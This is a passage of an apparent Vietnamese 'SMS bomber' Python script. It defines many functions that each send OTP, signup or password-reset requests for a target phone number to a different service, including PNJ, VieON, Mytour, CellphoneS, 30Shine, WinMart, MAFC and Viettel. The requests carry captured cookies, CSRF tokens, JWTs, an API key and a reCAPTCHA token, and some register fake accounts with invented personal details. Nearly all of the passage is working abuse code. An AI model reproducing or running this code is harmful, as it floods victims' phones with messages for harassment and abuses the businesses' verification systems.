        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=New; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_method': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'type': 'zns',
        'phone': sdt,
    }
    try:
        response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()
        print("PNJ1 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PNJ1 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def call():
    global thanhcong
    cookies = {
        'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
        'tel': sdt,
    }

    headers = {
        'Host': 'kavaycash.com',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Requested-With': 'mark.via.gp',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://kavaycash.com/',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'Cookie': 'csrftoken=jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7; tel=0357497741',
    }

    response = requests.get('https://kavaycash.com/verification/', cookies=cookies, headers=headers)
def vieton():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDAxMjA4MDQsImp0aSI6IjJkOTZiZGI1NDcyZTljODE1NTViOTM0ZTljZTY1ODFiIiwiYXVkIjoiIiwiaWF0IjoxNzM5OTQ4MDA0LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTczOTk0ODAwMywic3ViIjoiYW5vbnltb3VzX2VkNjk1NzY5NzJhZDRmNDQwZGQ1Y2MwNWM0YjkzMDcxLTE2YmFlYWNiM2UyM2FiMmNhNDc4ZWIwODdiOTU1ODM2LTE3Mzk5NDgwMDQiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZWQ2OTU3Njk3MmFkNGY0NDBkZDVjYzA1YzRiOTMwNzEtMTZiYWVhY2IzZTIzYWIyY2E0NzhlYjA4N2I5NTU4MzYtMTczOTk0ODAwNCIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.7AghhltXl3vXA4blWj4Jgx4tmOz1DQkfh22AE1Iff24',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'ed69576972ad4f440dd5cc05c4b93071',
        'device_name': 'Chrome/131',
        'device_type': 'desktop',
        'notification_type': 'phone_forgot_password_otp',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/password/forgot', params=params, headers=headers, json=json_data)
def best1():
    headers = {
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://www.best-inc.vn',
        'Referer': 'https://www.best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }
    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }
    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data).json()

def vntour():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'apphash': 'tEYKZKR7WBV4oh4D0rlRwprAFddIKd0KOwwdib3twZA=',
        'appid': 'mytour-web',
        'caid': '17',
        'content-type': 'application/json;charset=UTF-8',
        'countrycode': 'VN',
        'currency': 'VND',
        'deviceid': '1740294622868-0.24182192946667636',
        'deviceinfo': 'PC-Web',
        'lang': 'vi',
        'origin': 'https://mytour.vn',
        'platform': 'website',
        'priority': 'u=1, i',
        'referer': 'https://mytour.vn/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://apis.tripi.vn/account/sendSignupOTP', headers=headers, json=json_data)

def hoangnghia():
    cookies = {
        '_gcl_au': '1.1.1327118173.1740295751',
        '_ga': 'GA1.1.1325887515.1740295752',
        'popup_369': 'on',
        '__RequestVerificationToken': 'LiSkFvuEmfMCJ8RXykbT_EselVZcRdaFoWlfC0lg53EIHsjKweeUK6v7etHP-Vmdtk7nhuqQ59Z_M2vemwYQ5kFEeSE1',
        'ASP.NET_SessionId': 'vkliwyukqy2est25bm3ktdus',
        '_ga_9RNXP89DN9': 'GS1.1.1740295752.1.1.1740295859.51.0.0',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '_gcl_au=1.1.1327118173.1740295751; _ga=GA1.1.1325887515.1740295752; popup_369=on; __RequestVerificationToken=LiSkFvuEmfMCJ8RXykbT_EselVZcRdaFoWlfC0lg53EIHsjKweeUK6v7etHP-Vmdtk7nhuqQ59Z_M2vemwYQ5kFEeSE1; ASP.NET_SessionId=vkliwyukqy2est25bm3ktdus; _ga_9RNXP89DN9=GS1.1.1740295752.1.1.1740295859.51.0.0',
        'origin': 'https://hoanghamobile.com',
        'priority': 'u=1, i',
        'referer': 'https://hoanghamobile.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        '__RequestVerificationToken': 'YO7_i1Tzpo-Hb6dbiakz6mXhcWKly0CpvYYUMIIh9Am9zZMOh8T1-dmBwGpGGbJV-EBVfNDHAG5DRmW8zK7EymSFHu81',
        'LoginType': '1',
        'LoginStep': '1',
        'Phone': sdt,
    }

    response = requests.post('https://hoanghamobile.com/account/login', cookies=cookies, headers=headers, data=data)

def cellphones():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://account.cellphones.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.cellphones.com.vn/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-client-type': 'web',
    }

    json_data = {
        'active_token': 'pdKJbn3jcMAO0ZjX9EbrWIB9vtDBe2Qxx_nqC_LPC5o',
        'phone': sdt,
    }

    response = requests.post('https://api.cellphones.com.vn/v3/otp/phone/send', headers=headers, json=json_data)

def vnsolution():
    cookies = {
        'Abp.Localization.CultureName': 'vi',
        'ASP.NET_SessionId': 'uidafntxnxfmhlbh2r2wxt3v',
        '__RequestVerificationToken': 'ypc4id4AiiM5PVUrPCsl38tyhybtUKPyQAJavuMHlbNSfIWJEQFMNYgaFw_nv5enWJEjTmwSlAl24bqRM6xCX4X7VJ7ot7FlfExpYAp2GVI1',
        'XSRF-TOKEN': 'ty9vO138RSotpZqZWLZyhpaCnE5hfoTMATsC-AXbLRqnOAQPDHA_PcuMWegj-y5N8CLgTN9n6jNiQ5k70cl8X685HmFzXKTu1jIf95M5wqI1',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        # 'Cookie': 'Abp.Localization.CultureName=vi; ASP.NET_SessionId=uidafntxnxfmhlbh2r2wxt3v; __RequestVerificationToken=ypc4id4AiiM5PVUrPCsl38tyhybtUKPyQAJavuMHlbNSfIWJEQFMNYgaFw_nv5enWJEjTmwSlAl24bqRM6xCX4X7VJ7ot7FlfExpYAp2GVI1; XSRF-TOKEN=ty9vO138RSotpZqZWLZyhpaCnE5hfoTMATsC-AXbLRqnOAQPDHA_PcuMWegj-y5N8CLgTN9n6jNiQ5k70cl8X685HmFzXKTu1jIf95M5wqI1',
        'Origin': 'https://digital.yteviettel.vn',
        'Referer': 'https://digital.yteviettel.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'ty9vO138RSotpZqZWLZyhpaCnE5hfoTMATsC-AXbLRqnOAQPDHA_PcuMWegj-y5N8CLgTN9n6jNiQ5k70cl8X685HmFzXKTu1jIf95M5wqI1',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'soDienThoai': sdt,
    }

    response = requests.post(
        'https://digital.yteviettel.vn/account/LayMaXacThucDangKyTaiKhoan',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def shine():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': sdt,
        'method': 'zalo',
        'recaptcha': '03AFcWeA47Ru6GQz4p-O1yUf21sTyIWQkYZb-xTaImD3qqHxxylQZAnZ0t27p7QIb5qzAvps4oNHe6zAzXXohYD1N_ZxbdTI82MbQolXKjUv6-ZaktOjopnkIj5VdWXh6e8XC-iMqx40DXh2tL_pF0D9g5EmCUPgbgGGuJAL00KhILXR7ALh_NbzKiebCWezRoo_YrFgtUO6W81EXnuC2wSTPlpEb-byDoC7sERzlH56O-_AbweBvsKm8UeooJYTXKvJ4TCa8kxLU6JlQXE5URQR8rhWPyC7DpDREaGPzkVXqRAPUxq55FnN3BOutNIRrpyqk1L0K3z7RDKLvYqiJgqRfe3s6zAZkSqg9yBWhaUPEzq4NMg0gC5Ju8j5XYBNZIJ6QowgQVHfPMQq4BHj8bSUdJQBUmVzOVbeJEr8Sm5vnCIn9Dd4n1eUoy_CxlySiL_rxCxW-9GmAjCWj-ZBZwtMJLcwJZl_oy3TLC5D27ykVQZ1omFEaFKPoKgAGlciVs_gTIdIpxY0LN5t6gkbwkIfU2oPhGOYdKNwJFPKwmD408hAdnM6DztTp9YFezzVZrv2_YW85wkQ2nxsPthjVzYBOXpxzjuEpJgJiT-SX5Q7QdrZL2UILZkw5z711e7GTjnD7toQSyqnSKVF8cqE8xzvZmUGU4RZLarAh3fNohyEi7Bf2VM88FbFPxNsa-uOXIfetkdve8N05tspEFWIhfwbg9Hvlgusade573hqGbtki4_GXsgUte6wY-p0HxbpOuhf2X5VxR5dZjcypEXANgT8uIHGY4w8a38pl9PWsCo0Ty8qAL89ev3IwyhWbDswdc_2WnOapNzDdWyV8ChxJVCIcweDfpZY6CkxBciHJnT1kt_z1R3gUDvPOKUx4ncuP0ghi3slBBc4KmUFfGn48FpmlTY-FHSDM-6tGsT6uJ-RtSO4CkmgI3Q1AnJa5mNkU4tXDCm53vjbTBxKnHCh0yKNXDu7dNkQi5sPx9QH6oLJzF_-orQqzT6zG5Xdz0KccvjrWqGwOtfhOpUP9LCXjM1gD6NPndCEs76tb0WAJl5kUAgxu8CdtocLd0ykSf8Vzq3fxgs1ZExFtXOGmpm56kg5I-8Cj7sTrl5WBKR89ggENBCfRHCHmlBwix79O-IvIRrjS1DE9fP-W5iPtbe4q9ad4ytUF5UIlCyC6pVlRwZ8OESCrl1_E1j6KY84XUA8LKWq0ywlg_8Y6NKlw64IvT4DjcpU-UnLip17K8Nl3wm3aZyhyAL0exX0XTcVGhLwnt-Wlmnu1PyadfF2v0ratn5XimfK13U71Ywqqj8K8t2kxIbMoB415I9R8D29Y65QeGoVyDM3DAmmGc3SuOKL-K9sAv9PUqkQM8iP46PTiVyIBotVwIN8THpVEfQwuaN8XzpxOcobRnfau-MyG7XH6k2F9QRXkrZAcRnQD51glLvOmGnh7CgCk7o-3AwbEW9oZ_3cYX8nsj2_o1oTMxSM5tXdKcSCdSSxR1itD7wI-AnlDaFPujymB4SAl9EqO-WQUSV3brwrtLY45wjfiIbpQidLy7ik_i-FjDORBWoc3SZ_HpSB1J9tLGkXkI7k4tTviJd4njIgHstUHUljoFW1M-H4DCA1bjOtgZwWIn4eJZCqtBF2noBVr_EEjucMKT97VCrgFUVRWfMpkKyVP4lrytTM8GddEh8C2nDL4fXRFzXrFkGI0lJu2MLFNDjPMGPRIV3rJRA5i8gsbvfl9Vgq4hEHUy1NLsHTCq0iV_EFRCdhazqIWir7X3y7yrvx0bmdBNYELZ9LaF4fYT_Fb-sy69F-kOZMHYfPPI2BcHYjo2_oQZllgx7EbE5WQrfuxR9irElNQ76D4_i0eHWf2sbaBgVoIUtehcPRhUeIG9EWmP9aMHcDrS4f9PhmDzr9Hq7vSzDIx6XAlQeSX1gt-S6WMEZl0lYAftJGsG4pdH8sBCkdN0tlAcjgMhNhQBVpv8to9p-x76LGuOyd3hRVt7QYegICq-EZHaC7smDHrHTYUysmWAzCI-T6enHF-ydgmRbZvzc0otgdloBsash3ChGkXUqLPyiuFdYtYs_w',
    }

    response = requests.post(
        'https://qeypruo0z5.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
        headers=headers,
        json=json_data,
    )

def phuclong():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://www.phuclong.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.phuclong.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-api-key': '0abe808e7365aed48367254be610e895ef3ab9e9fd47e54dde554e23d5d97d04',
    }

    json_data = {
        'phoneNumber': sdt,
        'fullName': 'PHẠM GIA KHIÊM',
        'email': 'jhg@gmail.com',
        'password': 'kjhgfds12345@',
    }

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data)

def mafc():
    cookies = {
        'mafc_cspm': '1234',
        'pll_language': 'vi',
        'BIGipServerPool_www.mafc.com.vn': '654334730.20480.0000',
        'mafcavraaaaaaaaaaaaaaaa_session_': 'GHEPHDIDACEOOLACONDOBPJKCBHGGELFLJBNMFJDMMPLHENOHIHBOGCEBFAGCOMAHAKDNMINKCDLGPGFDAMANHFPMHNJFGPPEPPBEJEAFDMMHJHNKLKJCNNEDOKFMHGC',
        '_ga': 'GA1.1.645172607.1740141336',
        'MAFC00000000233': '0850209877ab2800bf2d947c0190082483d1d6d8c1bd3e913444c92b6e968ad52ce72ae03e715ba010a018d58e7512fa08cfed935009d00043edf056e3f9797f9df0ecd9e93856c4ad121d0704c5fb4ce49ff0a46ec19ba34c579ebdf0084a0ebe7b87015fff80e7d641f6cb2e95a91b82be4d2fbd2850e6aa5584167c8f6e5ea1e42b678ae40551187904dbba67a91099d73b182bf14d832c9b240402ad0dddb4478991d89f70c5e79cda72c1301a2473521f805bc758a42413d58bef374f890632c0c6504da4dd40c3bcdfd322059b47907360163d9bdd7a6a58e3af7cb0d30064e5942ce86bfd1dd08ebad85a76b3f4a8e6d6e7795280224a46f9844098a1db743d508d87feeb',
        'MAFC_101_DID': '0850209877ab2800bf2d947c0190082483d1d6d8c1bd3e913444c92b6e968ad52ce72ae03e715ba010a018d58e7512fa08cfed9350063800e4b88e2067df99e3b190f0fd84316a70a32f924546c074518a911fba74444186f51a95d93f1fce1e817bf3a9820779910721db74b1b09e92',
        '_ga_0L9WRBG2WG': 'GS1.1.1740141336.1.1.1740141350.0.0.0',
        'MAFC01f6952f': '018fd3cf68d21ca2236765cfc898c702e76d208fd3571712ed72a6a23eacd7b318b2d1546a0b2628103020089bb1ba42c41cc932678d9d6817772b2bd975b769165e0956d2224e4bb8b5599e37e462b339f2697654eee6c20058938fd98ee50595830afffe3c7f0ba4dc1260950c73fe3a3e46a03fb0a6c02d5ad13f371164fe716c468eee',
        'MAFCed66693a184': '0850209877ab2000ba4362952de373970ecffe1a587d07356095201e18467ebd0e641e7dcd4a7804083351df97113000f73836f1d5524c53ed4d3957cb8d49818513549360261ea6b0c32afc0297113fde2be7dbbd63f18345e4617cf357bf73',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json',
        # 'cookie': 'mafc_cspm=1234; pll_language=vi; BIGipServerPool_www.mafc.com.vn=654334730.20480.0000; mafcavraaaaaaaaaaaaaaaa_session_=GHEPHDIDACEOOLACONDOBPJKCBHGGELFLJBNMFJDMMPLHENOHIHBOGCEBFAGCOMAHAKDNMINKCDLGPGFDAMANHFPMHNJFGPPEPPBEJEAFDMMHJHNKLKJCNNEDOKFMHGC; _ga=GA1.1.645172607.1740141336; MAFC00000000233=0850209877ab2800bf2d947c0190082483d1d6d8c1bd3e913444c92b6e968ad52ce72ae03e715ba010a018d58e7512fa08cfed935009d00043edf056e3f9797f9df0ecd9e93856c4ad121d0704c5fb4ce49ff0a46ec19ba34c579ebdf0084a0ebe7b87015fff80e7d641f6cb2e95a91b82be4d2fbd2850e6aa5584167c8f6e5ea1e42b678ae40551187904dbba67a91099d73b182bf14d832c9b240402ad0dddb4478991d89f70c5e79cda72c1301a2473521f805bc758a42413d58bef374f890632c0c6504da4dd40c3bcdfd322059b47907360163d9bdd7a6a58e3af7cb0d30064e5942ce86bfd1dd08ebad85a76b3f4a8e6d6e7795280224a46f9844098a1db743d508d87feeb; MAFC_101_DID=0850209877ab2800bf2d947c0190082483d1d6d8c1bd3e913444c92b6e968ad52ce72ae03e715ba010a018d58e7512fa08cfed9350063800e4b88e2067df99e3b190f0fd84316a70a32f924546c074518a911fba74444186f51a95d93f1fce1e817bf3a9820779910721db74b1b09e92; _ga_0L9WRBG2WG=GS1.1.1740141336.1.1.1740141350.0.0.0; MAFC01f6952f=018fd3cf68d21ca2236765cfc898c702e76d208fd3571712ed72a6a23eacd7b318b2d1546a0b2628103020089bb1ba42c41cc932678d9d6817772b2bd975b769165e0956d2224e4bb8b5599e37e462b339f2697654eee6c20058938fd98ee50595830afffe3c7f0ba4dc1260950c73fe3a3e46a03fb0a6c02d5ad13f371164fe716c468eee; MAFCed66693a184=0850209877ab2000ba4362952de373970ecffe1a587d07356095201e18467ebd0e641e7dcd4a7804083351df97113000f73836f1d5524c53ed4d3957cb8d49818513549360261ea6b0c32afc0297113fde2be7dbbd63f18345e4617cf357bf73',
        'origin': 'https://mafc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://mafc.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': sdt,
        'nationalId': '123532168764',
        'vendorCode': 'INTERNAL_MKT',
        'channel': 'LDP',
    }

    response = requests.post(
        'https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/apitouch.php',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def myviettel():
    cookies = {
        '_ga': 'GA1.1.332055932.1740138928',
        '_ga_ZN9X6XYDZV': 'GS1.1.1740138927.1.1.1740139007.0.0.0',
        '_ga_3VWGCVHCP6': 'GS1.1.1740138928.1.1.1740139007.0.0.0',
        'laravel_session': 'TcKVKtEnTsG1bxeVddUd8eTCMAAquTOm6Syrj4a6',
        '_ga_VH8261689Q': 'GS1.1.1740142813.1.1.1740142813.60.0.0',
        'redirectLogin': 'https://viettel.vn/myviettel',
        '_gcl_au': '1.1.320986385.1740142817',
        '_ga_Z30HDXVFSV': 'GS1.1.1740142813.1.1.1740142833.0.0.0',
        'XSRF-TOKEN': 'eyJpdiI6Ik9HaHJsckU3enNLSlE3aFpDZXFnQ2c9PSIsInZhbHVlIjoiS1wvQU5PR3dQVTNJT2hzQlAraGtyUG5ZRlZocVdcL1ZadmNtdzB5Y01TVDQ3elBkUE5YYzVBdzZWZWNWaVE5Z2FxIiwibWFjIjoiMDYyOWY3MjdkN2ExNTZiNDRkZGRmZDcwZTM4NDM4MThjMDJlMjQwODJmNTZkY2UxOWFkMjBiODA2OGFkNzU3ZSJ9',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_ga=GA1.1.332055932.1740138928; _ga_ZN9X6XYDZV=GS1.1.1740138927.1.1.1740139007.0.0.0; _ga_3VWGCVHCP6=GS1.1.1740138928.1.1.1740139007.0.0.0; laravel_session=TcKVKtEnTsG1bxeVddUd8eTCMAAquTOm6Syrj4a6; _ga_VH8261689Q=GS1.1.1740142813.1.1.1740142813.60.0.0; redirectLogin=https://viettel.vn/myviettel; _gcl_au=1.1.320986385.1740142817; _ga_Z30HDXVFSV=GS1.1.1740142813.1.1.1740142833.0.0.0; XSRF-TOKEN=eyJpdiI6Ik9HaHJsckU3enNLSlE3aFpDZXFnQ2c9PSIsInZhbHVlIjoiS1wvQU5PR3dQVTNJT2hzQlAraGtyUG5ZRlZocVdcL1ZadmNtdzB5Y01TVDQ3elBkUE5YYzVBdzZWZWNWaVE5Z2FxIiwibWFjIjoiMDYyOWY3MjdkN2ExNTZiNDRkZGRmZDcwZTM4NDM4MThjMDJlMjQwODJmNTZkY2UxOWFkMjBiODA2OGFkNzU3ZSJ9',
        'origin': 'https://viettel.vn',
        'priority': 'u=1, i',
        'referer': 'https://viettel.vn/myviettel',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-csrf-token': 'dM93saJtFhBHyaOCKtADL9SqcschfqfB15uUdG8l',
        'x-requested-with': 'XMLHttpRequest',
